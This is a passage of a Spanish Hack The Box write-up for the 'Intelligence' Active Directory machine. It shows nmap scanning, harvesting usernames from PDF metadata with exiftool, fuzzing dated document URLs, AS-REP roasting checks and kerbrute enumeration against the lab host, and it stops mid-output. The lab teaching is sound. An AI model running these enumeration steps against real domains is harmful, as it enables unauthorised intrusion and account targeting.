<!doctype html><html lang=es>
<head>
<title>Intelligence | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Intelligence">
<meta property="og:description" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/intelligence/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2021-11-27T00:00:00+01:00">
<meta property="article:modified_time" content="2022-02-05T16:05:36+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Intelligence">
<meta itemprop=description content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta itemprop=datePublished content="2021-11-27T00:00:00+01:00">
<meta itemprop=dateModified content="2022-02-05T16:05:36+01:00">
<meta itemprop=wordCount content="2543">
<meta itemprop=keywords content="dns,smb,bloodhound,password-spray,active-directory,metadata,silver-ticket-attack,hash-cracking,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Intelligence">
<meta name=twitter:description content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/intelligence/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/intelligence/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/intelligence/&text=Intelligence" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/intelligence/&title=Intelligence" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Intelligence</h1>
<time class="f6 mv4 dib tracked" datetime=2021-11-27T00:00:00+01:00>27 / 11 / 2021</time>
</header>
<div class=htb-image>
<img alt=Intelligence src=/images/HTB/Intelligence/Intelligence.png>
</div>
<ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/dns title=DNS>DNS</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/smb title=SMB>SMB</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/bloodhound title=BloodHound>BloodHound</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-spray title="Password spray">Password spray</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/active-directory title="Active Directory">Active Directory</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/metadata title="Metadatos de archivos">Metadatos de archivos</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/silver-ticket-attack title="Ataque de Silver Ticket">Ataque de Silver Ticket</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/hash-cracking title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a>
</li>
</ul>
<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#encontrando-nombres-de-usuario-en-metadatos-de-archivos>Encontrando nombres de usuario en metadatos de archivos</a></li>
<li><a href=#encontrando-más-archivos-y-nombres-de-usuario>Encontrando más archivos y nombres de usuario</a></li>
<li><a href=#obtención-de-credenciales-válidas>Obtención de credenciales válidas</a></li>
<li><a href=#enumeración-por-smb>Enumeración por SMB</a></li>
<li><a href=#movimiento-lateral>Movimiento lateral</a></li>
<li><a href=#ataque-de-_silver-ticket_>Ataque de <em>Silver Ticket</em></a></li>
</ul>
</nav>
</div>
</aside>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Windows
</li>
<li>
<strong>Dificultad</strong>: Media
</li>
<li>
<strong>Dirección IP</strong>: 10.10.10.248
</li>
<li>
<strong>Fecha</strong>: 03 / 07 / 2021
</li>
</ul>
<h2 id=escaneo-de-puertos>Escaneo de puertos</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49229,49667,49691,49692,49704,49713 
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.36s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49229/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49704/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date:
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h15m31s, deviation: 0s, median: 7h15m30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 16 11:22:53 2021 -- 1 IP address (1 host up) scanned in 103.53 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) y 5985 (WinRM), entre otros.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
</code></pre></div><p>Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo <code>intelligence.htb</code> en <code>/etc/hosts</code>.</p>
<h2 id=enumeración-web>Enumeración web</h2>
<p>Si entramos en <code>http://10.10.10.248</code>, veremos una página web como la siguiente:</p>
<p><img src=../../../images/HTB/Intelligence/Intelligence-web.png alt="Intelligence web"></p>
<p>Bajando un poco, podremos descargar dos documentos PDF con dos enlaces:</p>
<p><img src=../../../images/HTB/Intelligence/Intelligence-pdf.png alt="Intelligence PDF downloads"></p>
<p>También podemos copiar los enlaces y utilizar <code>wget</code> desde la consola de comandos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ wget http://10.10.10.248/documents/2020-01-01-upload.pdf 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
</code></pre></div><h2 id=encontrando-nombres-de-usuario-en-metadatos-de-archivos>Encontrando nombres de usuario en metadatos de archivos</h2>
<p>Teniendo en cuenta que estamos intentando comprometer un entorno de Active Directory, necesitamos buscar nombres de usuario y credenciales (a lo mejor <em>hashes</em> NTLM o <em>tickets</em> de Kerberos).</p>
<p>El contenido de los documentos PDF es un simple texto <em>Lorem ipsum</em>, nada relevante.</p>
<p>Sin embargo, estos archivo PDF tienen metadatos. Entre estos metadatos, podemos encontrar dos nombres de usuario. Para extraer los metadatos podemos utilizar <code>exiftool</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ exiftool *.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number         : 12.30
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00 
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number         : 12.30
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
</code></pre></div><p>Y ahora tenemos dos nombres de usuario potenciales. Veamos si alguno de ellos es &ldquo;AS-REP Roasteable&rdquo;:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ GetNPUsers.py -usersfile users.txt -dc-ip 10.10.10.248 -no-pass intelligence.htb/ 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[-] User William.Lee doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</code></pre></div><p>Y vemos que no lo son. Veamos si por lo menos son usuarios válidos a nivel de dominio con <a href=https://github.com/ropnop/kerbrute><code>kerbrute</code></a>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
&gt;   dc.intelligence.htb:88
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       William.Lee@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jose.Williams@intelligence.htb
&gt;  Done! Tested <span style=color:#ae81ff>2</span> usernames <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> valid<span style=color:#f92672>)</span> in 0.123 seconds
</code></pre></div><p>Y sí lo son, pero hemos llegado a un callejón sin salida.</p>
<h2 id=encontrando-más-archivos-y-nombres-de-usuario>Encontrando más archivos y nombres de usuario</h2>
<p>Mirando el nombre de los archivos (<code>2020-01-01-upload.pdf</code> y <code>2020-12-15-upload.pdf</code>), podemos deducir que a lo mejor existen más archivos almacenados en el servidor con el mismo formato (es decir, <code>YYYY-MM-DD-upload.pdf</code>).</p>
<p>Para probar todas las posibilidades en el año 2020 se puede programar un <em>script</em> en Go llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence/reqPdf.go><code>reqPdf.go</code></a>, que realizará todas las peticiones y descargará los archivos encontrados en menos de un segundo (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence#reqPdfgo>aquí</a>):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ go run reqPdf.go
Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf 
Found 84 files in 784.6615ms
</code></pre></div><p>Como se puede ver, se han descargado 84 archivos (realmente, solo 82 son archivos nuevos). Ahora, podemos extraer los metadatos con <code>exiftool</code> al igual que antes. Esta vez, podemos utilizar un poco de <em>shell scripting</em> para filtrar los nombres de usuario y almacenarlos en un archivo evitando repeticiones:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ exiftool *.pdf | grep Creator | awk <span style=color:#e6db74>&#39;{ print $3 }&#39;</span> | sort -u | tee users.txt 
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
</code></pre></div><p>Veamos si los nombres de usuario son válidos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
&gt;   dc.intelligence.htb:88
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Brian.Morris@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Daniel.Shelton@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       David.Mcbride@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Ian.Duncan@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Darryl.Harris@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Anita.Roberts@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       David.Wilson@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       David.Reed@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Brian.Baker@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Danny.Matthews@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jason.Patterson@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       John.Coleman@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jessica.Moody@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jennifer.Thomas@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jason.Wright@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Jose.Williams@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Nicole.Brock@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Richard.Williams@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Kelly.Long@intelligence.htb
